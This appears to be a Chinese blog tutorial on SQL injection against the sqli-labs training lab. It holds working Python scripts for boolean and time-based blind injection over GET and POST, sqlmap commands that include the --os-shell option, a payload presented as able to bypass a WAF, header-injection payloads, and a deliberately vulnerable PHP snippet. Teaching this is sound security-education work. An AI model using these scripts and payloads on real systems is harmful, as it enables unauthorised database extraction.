+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">sql = <span class="string">&quot;select database()&quot;</span></span><br><span class="line">res = s.get(<span class="string">f&quot;http://www.sqli.com/Less-9/?id=1&#x27; and if(ascii(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;<span class="number">1</span>&#125;</span>,1))=115, sleep(3),1) -- +&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(res.elapsed.total_seconds() &gt; <span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;success&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>如果正常输出则说明测试成功，接下来编写脚本：<br />注意：超时重发时间设置稍微长一点便于筛选</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">       <span class="keyword">if</span> (IsTrue): </span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    recive = s.get(<span class="string">&quot;http://www.sqli.com/Less-9/?id=1&#x27; and if((ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125;),sleep(3),1) -- +&quot;</span>.<span class="built_in">format</span>(sql,i,j),timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                <span class="keyword">if</span> (recive.elapsed.total_seconds()) &gt; <span class="number">3</span>:</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    res += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破完成&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure>
+
+<p><a name="mZpLO"></a></p>
+<h4 id="POST型布尔盲注脚本编写"><a href="#POST型布尔盲注脚本编写" class="headerlink" title="POST型布尔盲注脚本编写"></a>POST型布尔盲注脚本编写</h4><p>post型对比get型区别不大，主要是requests中post方法的参数提供</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1 = <span class="string">&#x27;www.baidu.com&#x27;</span></span><br><span class="line">data1 = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>&#125;</span><br><span class="line">requests.post(url=url1,data=data1)</span><br><span class="line"><span class="comment"># post方法传递数据主要是键值对的形式</span></span><br></pre></td></tr></table></figure>
+<p>我们对get型的进行改编，以15关为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">       <span class="keyword">if</span> (IsTrue): </span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                datan=&#123;<span class="string">&quot;passwd&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uname&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">                datan[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;admin&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125; #&quot;</span>.<span class="built_in">format</span>(sql,i,j)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    recive = s.post(url=<span class="string">&quot;http://www.sqli.com/Less-15/&quot;</span>,data=datan,timeout=<span class="number">3</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    res += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破完成&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure>
+
+<p><a name="jDFVs"></a></p>
+<h4 id="POST型布尔盲注脚本-二分"><a href="#POST型布尔盲注脚本-二分" class="headerlink" title="POST型布尔盲注脚本(二分)"></a>POST型布尔盲注脚本(二分)</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        head = <span class="number">32</span></span><br><span class="line">        tail = <span class="number">127</span></span><br><span class="line">        mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">            datan=&#123;<span class="string">&quot;passwd&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uname&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">            datan[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;admin&#x27; and ascii(substr((&#123;0&#125;),&#123;1&#125;,1))&gt;&#123;2&#125; #&quot;</span>.<span class="built_in">format</span>(sql,i,mid)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                recive = s.post(url=<span class="string">&quot;http://www.sqli.com/Less-15/&quot;</span>,data=datan,timeout=<span class="number">3</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&#x27;../images/flag.jpg&#x27;</span> <span class="keyword">in</span> recive.text):</span><br><span class="line">                head = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail = mid</span><br><span class="line">            mid = (head+tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        res = res + <span class="built_in">chr</span>(mid)</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(mid) == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破成功&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;version()&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br></pre></td></tr></table></figure>
+
+<p><a name="FW1Gx"></a></p>
+<h4 id="POST型时间盲注脚本编写"><a href="#POST型时间盲注脚本编写" class="headerlink" title="POST型时间盲注脚本编写"></a>POST型时间盲注脚本编写</h4><p>我们只需要在布尔盲注上面添加if判断语句即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.Session()</span><br><span class="line">s.mount(<span class="string">&#x27;http://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line">s.mount(<span class="string">&#x27;https://&#x27;</span>, requests.adapters.HTTPAdapter(max_retries=<span class="number">3</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_dbInfo</span>(<span class="params">sql</span>):</span><br><span class="line">    res,IsTrue = <span class="string">&#x27;&#x27;</span>,<span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        <span class="keyword">if</span> (IsTrue): </span><br><span class="line">            IsTrue = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                datan=&#123;<span class="string">&quot;passwd&quot;</span>:<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;uname&quot;</span>:<span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">                datan[<span class="string">&#x27;uname&#x27;</span>]=<span class="string">&quot;admin&#x27; and if((ascii(substr((&#123;0&#125;),&#123;1&#125;,1))=&#123;2&#125;),sleep(3),1) #&quot;</span>.<span class="built_in">format</span>(sql,i,j)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    recive = s.post(url=<span class="string">&quot;http://www.sqli.com/Less-15/&quot;</span>,data=datan,timeout=<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    exit(<span class="string">&quot;网络错误，目前爆破到第&#123;&#125;位&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">                <span class="keyword">if</span> (recive.elapsed.total_seconds()) &gt; <span class="number">3</span>:</span><br><span class="line">                    IsTrue = <span class="literal">True</span></span><br><span class="line">                    res += <span class="built_in">chr</span>(j)</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>,<span class="string">&#x27;爆破完成&#x27;</span>,<span class="string">&#x27;-&#x27;</span>*<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">get_dbInfo(sql1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a name="p1pP5"></a></p>
+<h3 id="sqlmap工具的使用-介绍"><a href="#sqlmap工具的使用-介绍" class="headerlink" title="sqlmap工具的使用 介绍"></a>sqlmap工具的使用<br /> 介绍</h3><p> sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令。<br /><strong>基本参数：</strong><br /><a target="_blank" rel="noopener" href="https://www.yuque.com/answer-ctd2h/ke230u/ep09acunfuwz1rlo?inner=zbNKC&view=doc_embed">SQL注入漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://guuuuq.github.io/posts/11f9f536.html">sqlmap使用</a></p>
+<p> <strong>sqlmap的基本使用</strong><br /><strong>1、检测注入点</strong><br />检测注入点时，get型要带上url中的参数，如</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234027973.png" alt="image-20230724234027973"></p>
+<p>若sqlmap给出了相应的信息，则说明可以注入，我们接下来便可以进行爆库爆表爆字段爆数据的操作</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234105216.png" alt="image-20230724234105216"></p>
+<p><strong>2、爆库</strong></p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234116237.png" alt="image-20230724234116237"></p>
+<p>获取当前数据库名</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234128116.png" alt="image-20230724234128116"></p>
+<p><strong>3、爆表</strong></p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234139507.png" alt="image-20230724234139507"></p>
+<p><strong>4、爆字段</strong></p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234153690.png" alt="image-20230724234153690"></p>
+<p><strong>5、爆数据</strong></p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234205049.png" alt="image-20230724234205049"></p>
+<p>也可以指定字段爆数据：</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234217195.png" alt="image-20230724234217195"></p>
+<p><strong>常用参数</strong></p>
+<p>$$<br>| -p<br> | 标记注入点</p>
+<p>| –data<br> | 指定post参数，如:–data “username&#x3D;admin&amp;password&#x3D;admin”</p>
+<p>| -r<br> | 读取文件内容为监测数据，如: -r 1.txt</p>
+<p>| –level<br> | 设置测试的等级（1-5，默认为1）lv2：cookie; lv3：user-agent，refere; lv5：host </p>
+<p>| –risk<br> | 升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试;<br />risk 3：or语句的测试;</p>
+<p>| –random-agent<br> | 随机ua进行测试</p>
+<p>| –cookie<br> | 指定cookie进行请求测试</p>
+<p>| –os-shell<br> | 获取交互式shell</p>
+<p>| –dbms<br> | 指定数据库类型 ，如: –dbms&#x3D;mysql </p>
+<p>| –os<br> |  指定目标操作系统，如: –os&#x3D;windows</p>
+<p>| –threads<br> |  设置线程数 1~10 ，默认为1 </p>
+<p> |<br>$$<br><strong>sqlmap的POST型注入</strong><br /></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># --data 指定参数 -p 标记注入点</span><br><span class="line">python sqlmap.py -u http://www.sqli.com/Less-11/ --data=&quot;uname=admin&amp;passwd=123123&amp;submit=Submit&quot; -p uname,passwd</span><br><span class="line"> # -r 读取数据包检测 -p 标记注入点</span><br><span class="line">python sqlmap.py -u http://www.sqli.com/Less-11/ -r 1.txt -p uname,passwd</span><br></pre></td></tr></table></figure>
+
+<p><strong>可以绕waf的payload</strong><br />and(select*from(select+sleep(4))a&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select+1)&#x3D;’<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234510234.png" alt="image-20230724234510234"><br><a name="Fvj67"></a></p>
+<h3 id="HTTP头注入"><a href="#HTTP头注入" class="headerlink" title="HTTP头注入"></a>HTTP头注入</h3><p>常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234521508.png" alt="image-20230724234521508"><br /><strong>产生注入的条件</strong>：<br />- 能够对请求头消息进行修改<br />- 修改的请求头信息能够带入数据库进行查询<br />- 数据库没有对输入的请求信息做过滤<br /><strong>1. User-Agent注入</strong><br />User-Agent：使得服务器能够识别客户使用的操作系统，浏览器版本等。（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等然后将其存入数据库中）。这里获取User-Agent就可以知道客户都是通过什么浏览器访问系统的，然后将其值保存到数据库中。<br />以sqli-labs less-18关为例，登录用户密码：dumb ,0<br />1.1 判断注入点：user-agent值后面加上’，引发报错，确定存在sql注入<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234537489.png" alt="image-20230724234537489"><br />1.2 采用报错注入函数获取当前数据库名<br />‘ and updatexml(1,concat(‘^’,(database()),’^’),1) and ‘<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234554437.png" alt="image-20230724234554437"><br /><strong>2. cookie注入</strong><br /></p>
+<p>cookie功能多用于商城购物车，或者用户登录验证，可以对这些功能模块进行测试，抓取cookie包进行安全测试</p>
+<p>cookie：服务器端用来记录客户端的状态。由服务端产生，保存在浏览器中。传送门-》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114359205?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646553116780266210214%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646553116780266210214&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-114359205.pc_v1_rank_blog_v1&utm_term=cookie">cookie</a> 。以sqli-labs less-20关为例，登录后<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234606665.png" alt="image-20230724234606665"><br />2.1 首先判断注入点，加 ‘ 单引号报错<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234618463.png" alt="image-20230724234618463"><br />2.2 采用报错注入函数获取当前数据库名<br />‘ and updatexml(1,concat(‘^’,(database()),’^’),1) and ‘<br /><strong>3. Referer注入</strong><br /> ** Referer：<strong>是HTTP header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。<br />以19关为例<br />1. 判断输入点，加单引号引发报错<br />2. 使用报错注入函数：<br />‘ and updatexml(1,concat(0x7e,(database()),0x7e),0) and ‘<br /><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230724234632496.png" alt="image-20230724234632496"><br />方法都是一样的。<br /><strong>4. X-Forwarded-For 注入</strong><br /> ** X-Forwarded-For(XFF)：</strong>用来识别客户端最原始的ip地址。详见，传送门 -》<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/112528864?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161646592716780261962393%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=161646592716780261962393&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-1-112528864.pc_v1_rank_blog_v1&utm_term=X-for">X-Forwarded-For sql注入</a><br><a name="qkYtg"></a></p>
+<p>X-Forwarded-for简称XFF头，它代表客户端真实的IP，通过修改X-Forwarded-for的值可以伪造客户端IP。通过Burp Suite住区数据包内容，将X-Forwarded-for设置为11.22.33.44，然后访问改URL，页面返回正常。</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212811473.png" alt="image-20230804212811473"></p>
+<p>将X-Forwarded-for设置为11.22.33.44’，再次访问该URL，页面返回MySQL的报错信息，结果如图63所示。</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212914187.png" alt="image-20230804212914187"></p>
+<p>​                                              图63 访问X-Forwarded-for:11.22.33.44’的结果</p>
+<p>将X-Forwarded-for分别设置为11.22.33.44’ and 1&#x3D;1#和11.22.33.44’ and 1&#x3D;2#，再次访问该URL，结果如图64和图65所示。</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212932641.png" alt="image-20230804212932641"></p>
+<p>​                                           图64 访问X-Forwarded-for:11.22.33.44’ and 1&#x3D;1#的结果 </p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804212953057.png" alt="image-20230804212953057"></p>
+<p>​                                        图65 访问X-Forwarded-for:11.22.33.44’ and 1&#x3D;2#的结果</p>
+<p>通过页面的返回结果，可以判断出改地址存在SQL注入漏洞，接着可以使用order by判断表中的字段数量，最终测试出数据库中存在4个字段，尝试使用Union注入方法，语法是X-Forwarded-for:-11.22.33.44’ union select 1,2,3,4#，如图66所示。</p>
+<p><img src="https://typora-1317091701.cos.ap-beijing.myqcloud.com/typora/image-20230804213106986.png" alt="image-20230804213106986"></p>
+<p>​                                                                            图66 使用Union注入</p>
+<p>接着，使用Union注入方法完成此次注入。</p>
+<p>XFF注入代码分析<br>PHP中的getenv()函数用于获取一个环境变量的值，类似于$_SERVER或$_ENV，返回环境变量对应的值，如果环境变量不存在则返回FALSE。<br>使用以下代码即可获取客户端IP地址，程序先判断是否存在HTTP头部参数HTTP_CLIENT_IP，如果存在，则付给$ip，如果不存在，则判断是否存在HTTP头部参数HTTP_X_FORWARDED_FOR，如果存在，则赋给$ip，如果不存在，则将HTTP头部参数REMOTE_ADDR赋给$ip。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$con</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;连接失败: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;REMOTE_ADDR&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="string">&quot;select * from users where `ip`=&#x27;<span class="subst">$ip</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Error: %s\n&quot;</span>, <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="string">&quot; : &quot;</span> . <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>接下来，将$ip拼接到select语句，然后将查询结果输出到界面上。<br>由于HTTP头部参数是可以伪造的，所以可以添加一个头部参数CLIENT_IP或X_FORWARDED_FOR。当设置X_FORWARDED_FOR&#x3D;1’ union select 1,2,3#时，执行的SQL语句为：<br><code>select * from user where ip=&#39;1&#39; union select 1,2,3#&#39;</code></p>
+<p>此时SQL语句可以分为select * from user where <code>ip</code>&#x3D;’1’和union select 1,2,3两条，利用第二条语句（Union查询）就可以获取数据库中的数据。</p>
